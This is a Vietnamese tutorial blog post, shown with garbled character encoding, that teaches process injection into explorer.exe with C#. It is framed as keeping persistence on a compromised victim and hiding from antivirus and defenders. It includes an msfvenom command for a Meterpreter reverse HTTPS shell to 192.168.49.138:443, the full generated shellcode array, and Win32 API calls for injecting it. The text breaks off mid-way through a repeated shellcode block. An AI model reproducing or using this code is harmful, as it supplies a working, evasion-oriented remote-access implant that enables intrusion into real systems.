![](https://images.viblo.asia/059456fe-1819-40aa-af82-79e4f662dcc4.png)

-----------------

*BÃ i toÃ¡n Ä‘áº·t ra lÃ  trÆ°á»ng há»£p chÃºng ta Ä‘Ã£ chiáº¿m quyá»n Ä‘iá»u khiá»ƒn Victim thÃ nh cÃ´ng (RCE), tuy nhiÃªn cáº§n duy trÃ¬ sá»± hiá»‡n diá»‡n thÆ°á»ng xuyÃªn, Ä‘á»“ng thá»i che máº¯t AntiVirus vÃ  Ä‘á»™i ngÅ© Blue Team. Trong quÃ¡ trÃ¬nh hoáº¡t Ä‘á»™ng thÃ´ng thÆ°á»ng, náº¡n nhÃ¢n cÃ³ thá»ƒ Ä‘Ã³ng á»©ng dá»¥ng hay mÃ£ Ä‘á»™c bá»‹ phÃ¡t hiá»‡n vÃ  bá»‹ xÃ³a Ä‘i. Do Ä‘Ã³ chÃºng ta cáº§n quÃ¡ trÃ¬nh process injection* 

![](https://images.viblo.asia/819d020f-7834-4f35-8ab6-3ce2d75b815a.png)

Äá»ƒ kÃ©o dÃ i tuá»•i thá» cá»§a Malware, chÃºng ta cÃ³ thá»ƒ "anh hÃ¹ng nÃºp" trong má»™t process há»£p phÃ¡p.Má»™t trong nhá»¯ng process nhÆ° váº­y lÃ  explorer.exe. 

> explorer.exe luÃ´n lÃ  má»™t má»¥c tiÃªu lÃ½ tÆ°á»Ÿng Ä‘á»ƒ injection. ÄÆ¡n giáº£n nÃ³ luÃ´n tá»“n táº¡i vÃ  khÃ´ng thoÃ¡t ra cho Ä‘áº¿n khi ngÆ°á»i dÃ¹ng Ä‘Äƒng xuáº¥t.
# 1. Process Injection

Theo Ä‘á»‹nh nghÄ©a, má»™t process lÃ  má»™t container Ä‘Æ°á»£c táº¡o ra Ä‘á»ƒ chá»©a má»™t á»©ng dá»¥ng Ä‘ang cháº¡y. Má»—i tiáº¿n trÃ¬nh Windows thÃ¬ duy trÃ¬ má»™t "virtual memory space" cá»§a riÃªng nÃ³. Äá»“ng thá»i chÃºng ta cÃ³ thá»ƒ tÆ°Æ¡ng tÃ¡c vá»›i nÃ³ thÃ´ng qua Win32 API

Vá» tá»•ng quan, chÃºng ta cÃ³ thá»ƒ báº¯t Ä‘áº§u process injection báº±ng cÃ¡ch má»Ÿ má»™t channel tá»« process nÃ y sang process khÃ¡c thÃ´ng qua hÃ m `OpenProcess` - sau Ä‘Ã³ chÃºng ta sáº½ sá»­ Ä‘á»•i khÃ´ng gian bá»™ nhá»› thÃ´ng qua hÃ m `VirtualAllocEx` vÃ  `WriteProcessMemory` vÃ  cuá»‘i cÃ¹ng thá»±c thi bÃªn trong process vá»›i `CreateRemoteThread`

Äáº§u tiÃªn, Ä‘á»ƒ cÃ³ thá»ƒ can thiá»‡p vÃ o má»™t process - chÃºng ta cáº§n cÃ³ **quyá»n** lÃ m Ä‘iá»u Ä‘Ã³ vá»›i tham sá»‘ check `dwDesiredAccess`

[![Screenshot_10.png](https://0xbadcode.ml/uploads/images/gallery/2022-04/scaled-1680-/Screenshot_10.png)](https://0xbadcode.ml/uploads/images/gallery/2022-04/Screenshot_10.png)

**Má»Ÿ `notepad` vá»›i user thÃ´ng thÆ°á»ng - tiáº¿n trÃ¬nh notepad.exe khá»Ÿi cháº¡y**

[![Screenshot_14.png](https://0xbadcode.ml/uploads/images/gallery/2022-04/scaled-1680-/Screenshot_14.png)](https://0xbadcode.ml/uploads/images/gallery/2022-04/Screenshot_14.png)


Kiá»ƒm tra tiáº¿n hÃ¬nh vá»›i `process_dump (https://docs.microsoft.com/en-us/sysinternals/downloads/process-explorer)`

![](https://images.viblo.asia/92121a5d-455b-48d4-8ae9-26be3b2978e8.png)

Kiá»ƒm tra kháº£ nÄƒng control cá»§a tÃ i khoáº£n vá»›i process nÃ y

![](https://images.viblo.asia/8f77fb10-5b83-4434-869d-55600df65d65.png)

Ta cÃ³ thá»ƒ tháº¥y ráº±ng, Notepad Ä‘Æ°á»£c báº£o máº­t á»Ÿ má»©c Ä‘á»™ trung bÃ¬nh, Ä‘á»“ng thá»i tÃ i khoáº£n user cÃ³ quyá»n Ä‘á»c vÃ  ghi vá»›i process nÃ y.

**Má»Ÿ `notepad` vá»›i user admin**

Khi nÃ y ta tháº¥y má»©c Ä‘á»™ báº£o máº­t Ä‘Ã£ Ä‘Æ°á»£c nÃ¢ng lÃªn má»©c HIGH

![](https://images.viblo.asia/4b677f87-5c4d-4f6f-8dca-64ff57edf203.png)

vÃ  user thÆ°á»ng khÃ´ng cÃ²n quyá»n truy cáº­p vÃ o process nÃ y ná»¯a

![](https://images.viblo.asia/45a08894-4b97-44d8-aab2-db01f65b7a07.png)


NhÆ° váº­y ta chá»‰ cÃ³ thá»ƒ injection vÃ o process Ä‘ang cháº¡y á»Ÿ cÃ¹ng má»™t má»©c Ä‘á»™ toÃ n váº¹n hoáº·c tháº¥p hÆ¡n.


Quay láº¡i function sau Ä‘Ã¢y

![](https://images.viblo.asia/c20f4877-8f0c-4883-a7e7-069b8d0288dc.png)


* `bInheritHandle` xÃ¡c Ä‘á»‹nh xem return cÃ³ thá»ƒ Ä‘Æ°á»£c káº¿ thá»«a bá»Ÿi má»™t chÆ°Æ¡ng trÃ¬nh con hay khÃ´ng (BOOL)
* `dwProcessId ` chá»‰ Ä‘á»‹nh ID process cáº§n injection


Sau khi OpenProcess() Ä‘á»ƒ xÃ¡c Ä‘á»‹nh process, chÃºng ta sá»­ dá»¥ng VirtualAllocEx() Ä‘á»ƒ cáº¥p phÃ¡t bá»™ nhá»› - má»Ÿ rá»™ng khÃ´ng gian Ä‘á»ƒ chá»©a shellcode - cá»§a chÃºng ta

[![Screenshot_11.png](https://0xbadcode.ml/uploads/images/gallery/2022-04/scaled-1680-/Screenshot_11.png)](https://0xbadcode.ml/uploads/images/gallery/2022-04/Screenshot_11.png)

Tiáº¿p theo lÃ  `WriteProcessMemory` cho phÃ©p chÃºng ta injection shellcode vÃ o process.

[![Screenshot_12.png](https://0xbadcode.ml/uploads/images/gallery/2022-04/scaled-1680-/Screenshot_12.png)](https://0xbadcode.ml/uploads/images/gallery/2022-04/Screenshot_12.png)

vÃ  `CreateRemoteThread`  Ä‘á»ƒ run process

[![Screenshot_13.png](https://0xbadcode.ml/uploads/images/gallery/2022-04/scaled-1680-/Screenshot_13.png)](https://0xbadcode.ml/uploads/images/gallery/2022-04/Screenshot_13.png)

### 1.2. Process Injection vá»›i C# 
```
TÃ³m táº¯t quÃ¡ trÃ¬nh chÃºng ta sáº½ inject 1 Shellcode vÃ o process explorer sá»­ dá»¥ng C#
```

**NguyÃªn liá»‡u :**

* Shellcode (Generate vá»›i msfvenom)

```bash
sudo msfvenom -p windows/x64/meterpreter/reverse_https lhost=192.168.49.138 lport=443 -b "x00" -f csharp
```

```bash
byte[] buf = new byte[773] {
0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,
0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,
0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,
0x01,0xd0,0x66,0x81,0x78,0x18,0x0b,0x02,0x0f,0x85,0x72,0x00,0x00,0x00,0x8b,
0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,0x50,0x44,
0x8b,0x40,0x20,0x8b,0x48,0x18,0x49,0x01,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x4d,
0x31,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x48,0x31,0xc0,0x41,0xc1,0xc9,
0x0d,0xac,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,
0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x41,0x8b,
0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,0x88,0x41,0x58,
0x48,0x01,0xd0,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,
0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,
0x4b,0xff,0xff,0xff,0x5d,0x48,0x31,0xdb,0x53,0x49,0xbe,0x77,0x69,0x6e,0x69,
0x6e,0x65,0x74,0x00,0x41,0x56,0x48,0x89,0xe1,0x49,0xc7,0xc2,0x4c,0x77,0x26,
0x07,0xff,0xd5,0x53,0x53,0x48,0x89,0xe1,0x53,0x5a,0x4d,0x31,0xc0,0x4d,0x31,
0xc9,0x53,0x53,0x49,0xba,0x3a,0x56,0x79,0xa7,0x00,0x00,0x00,0x00,0xff,0xd5,
0xe8,0x0f,0x00,0x00,0x00,0x31,0x39,0x32,0x2e,0x31,0x36,0x38,0x2e,0x34,0x39,
0x2e,0x31,0x33,0x38,0x00,0x5a,0x48,0x89,0xc1,0x49,0xc7,0xc0,0x5c,0x11,0x00,
0x00,0x4d,0x31,0xc9,0x53,0x53,0x6a,0x03,0x53,0x49,0xba,0x57,0x89,0x9f,0xc6,
0x00,0x00,0x00,0x00,0xff,0xd5,0xe8,0xdb,0x00,0x00,0x00,0x2f,0x4d,0x45,0x76,
0x4b,0x50,0x6c,0x44,0x53,0x69,0x76,0x4e,0x4e,0x35,0x30,0x7a,0x6c,0x4c,0x36,
0x5f,0x41,0x78,0x77,0x39,0x77,0x77,0x61,0x55,0x41,0x6d,0x43,0x6b,0x7a,0x4b,
0x5f,0x51,0x61,0x48,0x4d,0x58,0x53,0x70,0x75,0x4b,0x6b,0x73,0x73,0x73,0x69,
0x71,0x52,0x44,0x34,0x46,0x58,0x69,0x52,0x34,0x35,0x52,0x7a,0x33,0x38,0x6b,
0x72,0x68,0x75,0x41,0x6d,0x2d,0x66,0x6f,0x5a,0x36,0x49,0x32,0x6a,0x78,0x44,
0x76,0x75,0x72,0x6e,0x66,0x62,0x64,0x4f,0x45,0x33,0x57,0x33,0x65,0x54,0x51,
0x59,0x4a,0x59,0x4e,0x64,0x67,0x4d,0x66,0x4c,0x41,0x74,0x59,0x51,0x67,0x39,
0x4f,0x72,0x67,0x71,0x48,0x55,0x70,0x34,0x44,0x59,0x47,0x53,0x64,0x4d,0x37,
0x52,0x47,0x75,0x4d,0x32,0x46,0x43,0x6a,0x38,0x38,0x50,0x52,0x4d,0x58,0x59,
0x57,0x57,0x6d,0x56,0x55,0x41,0x71,0x6d,0x6f,0x70,0x36,0x2d,0x61,0x4d,0x45,
0x50,0x75,0x37,0x53,0x53,0x4f,0x41,0x4e,0x56,0x59,0x5a,0x79,0x5f,0x7a,0x5f,
0x74,0x47,0x71,0x55,0x73,0x32,0x50,0x64,0x2d,0x34,0x65,0x65,0x46,0x6e,0x78,
0x41,0x52,0x32,0x6d,0x6f,0x41,0x59,0x4f,0x4f,0x6f,0x6a,0x32,0x65,0x4f,0x51,
0x4c,0x47,0x4d,0x32,0x51,0x55,0x51,0x2d,0x2d,0x32,0x42,0x43,0x2d,0x33,0x64,
0x54,0x31,0x2d,0x78,0x00,0x48,0x89,0xc1,0x53,0x5a,0x41,0x58,0x4d,0x31,0xc9,
0x53,0x48,0xb8,0x00,0x32,0xa8,0x84,0x00,0x00,0x00,0x00,0x50,0x53,0x53,0x49,
0xc7,0xc2,0xeb,0x55,0x2e,0x3b,0xff,0xd5,0x48,0x89,0xc6,0x6a,0x0a,0x5f,0x48,
0x89,0xf1,0x6a,0x1f,0x5a,0x52,0x68,0x80,0x33,0x00,0x00,0x49,0x89,0xe0,0x6a,
0x04,0x41,0x59,0x49,0xba,0x75,0x46,0x9e,0x86,0x00,0x00,0x00,0x00,0xff,0xd5,
0x4d,0x31,0xc0,0x53,0x5a,0x48,0x89,0xf1,0x4d,0x31,0xc9,0x4d,0x31,0xc9,0x53,
0x53,0x49,0xc7,0xc2,0x2d,0x06,0x18,0x7b,0xff,0xd5,0x85,0xc0,0x75,0x1f,0x48,
0xc7,0xc1,0x88,0x13,0x00,0x00,0x49,0xba,0x44,0xf0,0x35,0xe0,0x00,0x00,0x00,
0x00,0xff,0xd5,0x48,0xff,0xcf,0x74,0x02,0xeb,0xaa,0xe8,0x55,0x00,0x00,0x00,
0x53,0x59,0x6a,0x40,0x5a,0x49,0x89,0xd1,0xc1,0xe2,0x10,0x49,0xc7,0xc0,0x00,
0x10,0x00,0x00,0x49,0xba,0x58,0xa4,0x53,0xe5,0x00,0x00,0x00,0x00,0xff,0xd5,
0x48,0x93,0x53,0x53,0x48,0x89,0xe7,0x48,0x89,0xf1,0x48,0x89,0xda,0x49,0xc7,
0xc0,0x00,0x20,0x00,0x00,0x49,0x89,0xf9,0x49,0xba,0x12,0x96,0x89,0xe2,0x00,
0x00,0x00,0x00,0xff,0xd5,0x48,0x83,0xc4,0x20,0x85,0xc0,0x74,0xb2,0x66,0x8b,
0x07,0x48,0x01,0xc3,0x85,0xc0,0x75,0xd2,0x58,0xc3,0x58,0x6a,0x00,0x59,0x49,
0xc7,0xc2,0xf0,0xb5,0xa2,0x56,0xff,0xd5 };

```

* `explorer.exe` Process ID (5536)

[![Screenshot_1.png](https://0xbadcode.ml/uploads/images/gallery/2022-04/scaled-1680-/Screenshot_1.png)](https://0xbadcode.ml/uploads/images/gallery/2022-04/Screenshot_1.png)

* Code C# Visual Studio

```csharp
using System;
using System.Runtime.InteropServices;

namespace Inject
{
    class Program
    {
        static void Main(string[] args)
        {
        }
    }
}
```
* **Gá»i API Win32** 

Quay láº¡i quÃ¡ trÃ¬nh Process Injection ta cÆ¡ báº£n cÃ³ 4 quÃ¡ trÃ¬nh nhÆ° sau

**BÆ°á»›c 1** . Gá»i **OpenProcess** Ä‘á»ƒ xÃ¡c Ä‘á»‹nh process cáº§n injection

**BÆ°á»›c 2**.  Má»Ÿ rá»™ng khÃ´ng gian chá»©a shell code vá»›i **VirtualAllocEx**

**BÆ°á»›c 3**. Ghi shellcode vÃ o process vá»›i **WriteProcessMemory**

**BÆ°á»›c 4**. Thá»±c thi procees vá»›i **CreateRemoteThread**


> Váº­y Ä‘á»ƒ cÃ³ thá»ƒ thá»±c hiá»‡n hÃ nh cÃ´ng quÃ¡ trÃ¬nh process injection ta cáº§n láº§n lÆ°á»£t **gá»i** cÃ¡c API : **OpenProcess** , **VirtualAllocEx** , **WriteProcessMemory** , **CreateRemoteThread** sau Ä‘Ã³ **thá»±c thi** chÃºng vá»›i cÃ¡c parameter thÃ­ch há»£p

Äá»ƒ gá»i cÃ¡c API trÃªn, ta tiáº¿n hÃ nh truy cáº­p vÃ o **www.pinvoke.net**, sau Ä‘Ã³ láº§n lÆ°á»£t search cÃ¡c API trÃªn ta sáº½ cÃ³ Ä‘Æ°á»£c cÃ¡c káº¿t quáº£

**OpenProcess**

```csharp
[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
static extern IntPtr OpenProcess(uint processAccess,bool bInheritHandle,uint processId);
```

**VirtualAllocEx**

```csharp
[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
```

**WriteProcessMemory**

```csharp
[DllImport("kernel32.dll")] static extern bool WriteProcessMemory(IntPtr hProcess,IntPtr lpBaseAddress,byte[] 
lpBuffer,Int32 nSize,out IntPtr lpNumberOfBytesWritten);
```

**CreateRemoteThread**

```csharp
static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
```

Äoáº¡n code sáº½ trá»Ÿ nÃªn nhÆ° nÃ y

```csharp
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;

namespace ConsoleApp2
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr OpenProcess(uint processAccess,bool bInheritHandle,uint processId);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")] static extern bool WriteProcessMemory(IntPtr hProcess,IntPtr lpBaseAddress,byte[] lpBuffer,Int32 nSize,out IntPtr lpNumberOfBytesWritten);


        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        static void Main(string[] args)
        {
		   // Tham sá»‘ sáº½ ghi á»Ÿ Ä‘Ã¢y
        }
    }
}

```

**Sá»­ dá»¥ng Win32 API**

1. Äáº§u tiÃªn lÃ  API **OpenProcess** . Tra cá»©u trÃªn tÃ i liá»‡u cá»§a Microsoft ra cÃ³
`
```csharp
HANDLE OpenProcess(
  DWORD dwDesiredAccess,
  BOOL  bInheritHandle,
  DWORD dwProcessId
);
```

* Tham sá»‘ dwDesiredAccess lÃ  quyá»n truy cáº­p mÃ  chÃºng ta muá»‘n cÃ³ Ä‘Æ°á»£c cho process . GiÃ¡ trá»‹ cá»§a nÃ³ sáº½ Ä‘Æ°á»£c kiá»ƒm tra dá»±a trÃªn "security descriptor" (2 giÃ¡ trá»‹ nÃ y pháº£i tÆ°Æ¡ng thÃ­ch vá»›i nhau). á» Ä‘Ã¢y ra set quyá»n `PROCESS_ALL_ACCESS ` . Quyá»n nÃ y sáº½ cung cáº¥p cho chÃºng ta truy cáº­p Ä‘áº§y Ä‘á»§ vÃ o `explorer.exe`

[![Screenshot_2.png](https://0xbadcode.ml/uploads/images/gallery/2022-04/scaled-1680-/Screenshot_2.png)](https://0xbadcode.ml/uploads/images/gallery/2022-04/Screenshot_2.png)

Biá»ƒu diá»…n dÆ°á»›i dáº¡ng tháº­p lá»¥c phÃ¢n ta cÃ³ giÃ¡ trá»‹ **0x001F0FFF**

* Tham sá»‘ **bInheritHandle** cho chÃºng ta quyáº¿t Ä‘á»‹nh xem , liá»‡u má»™t child process Ä‘Ã£ táº¡o, cÃ³ thá»ƒ káº¿ thá»«a xá»­ lÃ½ nÃ y hay khÃ´ng. 

Trong trÆ°á»ng há»£p nÃ y, chÃºng ta khÃ´ng cáº§n quan tÃ¢m nÃªn Ä‘áº·t lÃ  **false**

* Tham sá»‘ **dwProcessId** cho ID cá»§a process `explorer.exe` mÃ  ta Ä‘Ã£ láº¥y Ä‘Æ°á»£c bÃªn trÃªn **5536**

Tá»•ng quan vá»›i API OpenProcess ta cÃ³

```csharp
IntPtr hProcess = OpenProcess(0x001F0FFF, false, 5536)
```

2. Tiáº¿p theo, chÃºng ta tiáº¿n hÃ nh bÆ°á»›c cáº¥p phÃ¡t bá»™ nhá»› vá»›i **VirtualAllocEx**, tra cá»©u tÃ i liá»‡u API ta cÃ³ cÃ¡c dÃ¹ng nhÆ° sau

```csharp
LPVOID VirtualAllocEx(
  HANDLE hProcess,
  LPVOID lpAddress,
  SIZE_T dwSize,
  DWORD  flAllocationType,
  DWORD  flProtect
);
```

* Tham sá»‘ **hProcess** chÃ­nh lÃ  process xá»­ lÃ½ explorer.exe mÃ  ta Ä‘Ã£ láº¥y Ä‘Æ°á»£c tá»« trÆ°á»›c

* Tham sá»‘ **lpAddress**  lÃ  Ä‘á»‹a chá»‰ mong muá»‘n mÃ  ta muá»‘n cáº¥p phÃ¡t cho remote process. Náº¿u API thÃ nh cÃ´ng,Buffer má»›i sáº½ Ä‘Æ°á»£c cáº¥p phÃ¡t vá»›i má»™t Ä‘á»‹a chá»‰ ban Ä‘áº§u nhÆ° Ä‘Æ°á»£c cung cáº¥p trong  lpAddress . Tuy nhiÃªn náº¿u giÃ¡ trá»‹ nÃ y Ä‘Ã£ Ä‘Æ°á»£c cáº¥p phÃ¡t thÃ¬ API sáº½ khÃ´ng gá»i thÃ nh cÃ´ng . Cho nÃªn tá»‘t nháº¥t Ä‘á»ƒ giÃ¡ trá»‹ null, API sáº½ sá»­ dá»¥ng má»™t Ä‘á»‹a chá»‰ khÃ´ng sá»­ dá»¥ng lpAddress = IntPtr.Zero


> QuÃ¡ trÃ¬nh nÃ y giá»‘ng nhÆ° khi ta sá»­ dá»¥ng IP static trong máº¡ng LAN. Náº¿u IP Ä‘Ã£ Ä‘Æ°á»£c dÃ¹ng rá»“i, káº¿t ná»‘i sáº½ khÃ´ng thÃ nh cÃ´ng. Thay vÃ¬ Ä‘Ã³ chÃºng ta sá»­ dá»¥ng DHCP Ä‘á»ƒ tá»± Ä‘á»™ng cáº¥p cÃ¡c IP Ä‘ang khÃ´ng Ä‘Æ°á»£c sá»­ dá»¥ng

* 3 tham sá»‘ **dwSize**, **flAllocationType**,  **flProtect** chá»‰ Ä‘á»‹nh : KÃ­ch thÆ°á»›c phÃ¢n bá»• mong muá»‘n , Kiá»ƒu cáº¥p phÃ¡t , Báº£o vá»‡ bá»‘ nhá»›

á» Ä‘Ã¢y ta set chÃºng tÆ°Æ¡ng á»©ng thÃ nh **0x1000 (4096 byte)** , **0x3000 (MEM_COMMIT vÃ  MEM_RESERVE)** ,  **0x40 (PAGE_EXECUTE_READWRITE)**

Tá»•ng quan vá»›i VirtualAllocEx ta cÃ³ 

```csharp
IntPtr addr = VirtualAllocEx(hProcess,IntPtr.Zero, 0x1000, 0x3000,0x40)
```
3. Tiáº¿p Ä‘áº¿n ta tiáº¿n hÃ nh sao chÃ©p Shellcode vÃ o memory space cá»§a explorer.exe thÃ´ng qua **WriteProcessMemory**

Tra cá»©u tÃ i liá»‡u Microsoft ta cÃ³ thÃ´ng sá»‘ nhÆ° sau

```
BOOL WriteProcessMemory(
  HANDLE  hProcess,
  LPVOID  lpBaseAddress,
  LPCVOID lpBuffer,
  SIZE_T  nSize,
  SIZE_T  *lpNumberOfBytesWritten
);
```
* Tham sá»‘ **hProcess** nhÆ° bÃªn trÃªn
* Tham sá»‘ **lpBaseAddress** lÃ  Ä‘á»‹a chá»‰ bá»™ nhá»› má»›i Ä‘Æ°á»£c cáº¥p phÃ¡t trong explorer.exe  
* Tham sá»‘ **lpBuffer** Ä‘á»‹a chá»‰ máº£ng byte chá»©a shellcode 
* Tham sá»‘  **nSize** lÃ  kÃ­ch thÆ°á»›c cá»§a shellcode sáº½ Ä‘Æ°á»£c sao chÃ©p
* Tham sá»‘ **lpNumberOfBytesWritten** Ä‘á»ƒ output ra bao nhiÃªu dá»¯ liá»‡u Ä‘Ã£ Ä‘Æ°á»£c sao chÃ©p

Káº¿t há»£p vá»›i shellcode Ä‘Ã£ táº¡o á»Ÿ trÃªn ta cÃ³ code

```
byte[] buf = new byte[773] {
0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,
0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,
0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,
0x01,0xd0,0x66,0x81,0x78,0x18,0x0b,0x02,0x0f,0x85,0x72,0x00,0x00,0x00,0x8b,
0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,0x50,0x44,
0x8b,0x40,0x20,0x8b,0x48,0x18,0x49,0x01,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x4d,
0x31,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x48,0x31,0xc0,0x41,0xc1,0xc9,
0x0d,0xac,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,
0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x41,0x8b,
0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,0x88,0x41,0x58,
0x48,0x01,0xd0,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,
0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,
0x4b,0xff,0xff,0xff,0x5d,0x48,0x31,0xdb,0x53,0x49,0xbe,0x77,0x69,0x6e,0x69,
0x6e,0x65,0x74,0x00,0x41,0x56,0x48,0x89,0xe1,0x49,0xc7,0xc2,0x4c,0x77,0x26,
0x07,0xff,0xd5,0x53,0x53,0x48,0x89,0xe1,0x53,0x5a,0x4d,0x31,0xc0,0x4d,0x31,
0xc9,0x53,0x53,0x49,0xba,0x3a,0x56,0x79,0xa7,0x00,0x00,0x00,0x00,0xff,0xd5,
0xe8,0x0f,0x00,0x00,0x00,0x31,0x39,0x32,0x2e,0x31,0x36,0x38,0x2e,0x34,0x39,
0x2e,0x31,0x33,0x38,0x00,0x5a,0x48,0x89,0xc1,0x49,0xc7,0xc0,0x5c,0x11,0x00,
0x00,0x4d,0x31,0xc9,0x53,0x53,0x6a,0x03,0x53,0x49,0xba,0x57,0x89,0x9f,0xc6,
0x00,0x00,0x00,0x00,0xff,0xd5,0xe8,0xdb,0x00,0x00,0x00,0x2f,0x4d,0x45,0x76,
0x4b,0x50,0x6c,0x44,0x53,0x69,0x76,0x4e,0x4e,0x35,0x30,0x7a,0x6c,0x4c,0x36,
0x5f,0x41,0x78,0x77,0x39,0x77,0x77,0x61,0x55,0x41,0x6d,0x43,0x6b,0x7a,0x4b,
0x5f,0x51,0x61,0x48,0x4d,0x58,0x53,0x70,0x75,0x4b,0x6b,0x73,0x73,0x73,0x69,
0x71,0x52,0x44,0x34,0x46,0x58,0x69,0x52,0x34,0x35,0x52,0x7a,0x33,0x38,0x6b,
0x72,0x68,0x75,0x41,0x6d,0x2d,0x66,0x6f,0x5a,0x36,0x49,0x32,0x6a,0x78,0x44,
0x76,0x75,0x72,0x6e,0x66,0x62,0x64,0x4f,0x45,0x33,0x57,0x33,0x65,0x54,0x51,
0x59,0x4a,0x59,0x4e,0x64,0x67,0x4d,0x66,0x4c,0x41,0x74,0x59,0x51,0x67,0x39,
0x4f,0x72,0x67,0x71,0x48,0x55,0x70,0x34,0x44,0x59,0x47,0x53,0x64,0x4d,0x37,
0x52,0x47,0x75,0x4d,0x32,0x46,0x43,0x6a,0x38,0x38,0x50,0x52,0x4d,0x58,0x59,
0x57,0x57,0x6d,0x56,0x55,0x41,0x71,0x6d,0x6f,0x70,0x36,0x2d,0x61,0x4d,0x45,
0x50,0x75,0x37,0x53,0x53,0x4f,0x41,0x4e,0x56,0x59,0x5a,0x79,0x5f,0x7a,0x5f,
0x74,0x47,0x71,0x55,0x73,0x32,0x50,0x64,0x2d,0x34,0x65,0x65,0x46,0x6e,0x78,
0x41,0x52,0x32,0x6d,0x6f,0x41,0x59,0x4f,0x4f,0x6f,0x6a,0x32,0x65,0x4f,0x51,
0x4c,0x47,0x4d,0x32,0x51,0x55,0x51,0x2d,0x2d,0x32,0x42,0x43,0x2d,0x33,0x64,
0x54,0x31,0x2d,0x78,0x00,0x48,0x89,0xc1,0x53,0x5a,0x41,0x58,0x4d,0x31,0xc9,
0x53,0x48,0xb8,0x00,0x32,0xa8,0x84,0x00,0x00,0x00,0x00,0x50,0x53,0x53,0x49,
0xc7,0xc2,0xeb,0x55,0x2e,0x3b,0xff,0xd5,0x48,0x89,0xc6,0x6a,0x0a,0x5f,0x48,
0x89,0xf1,0x6a,0x1f,0x5a,0x52,0x68,0x80,0x33,0x00,0x00,0x49,0x89,0xe0,0x6a,
0x04,0x41,0x59,0x49,0xba,0x75,0x46,0x9e,0x86,0x00,0x00,0x00,0x00,0xff,0xd5,
0x4d,0x31,0xc0,0x53,0x5a,0x48,0x89,0xf1,0x4d,0x31,0xc9,0x4d,0x31,0xc9,0x53,
0x53,0x49,0xc7,0xc2,0x2d,0x06,0x18,0x7b,0xff,0xd5,0x85,0xc0,0x75,0x1f,0x48,
0xc7,0xc1,0x88,0x13,0x00,0x00,0x49,0xba,0x44,0xf0,0x35,0xe0,0x00,0x00,0x00,
0x00,0xff,0xd5,0x48,0xff,0xcf,0x74,0x02,0xeb,0xaa,0xe8,0x55,0x00,0x00,0x00,
0x53,0x59,0x6a,0x40,0x5a,0x49,0x89,0xd1,0xc1,0xe2,0x10,0x49,0xc7,0xc0,0x00,
0x10,0x00,0x00,0x49,0xba,0x58,0xa4,0x53,0xe5,0x00,0x00,0x00,0x00,0xff,0xd5,
0x48,0x93,0x53,0x53,0x48,0x89,0xe7,0x48,0x89,0xf1,0x48,0x89,0xda,0x49,0xc7,
0xc0,0x00,0x20,0x00,0x00,0x49,0x89,0xf9,0x49,0xba,0x12,0x96,0x89,0xe2,0x00,
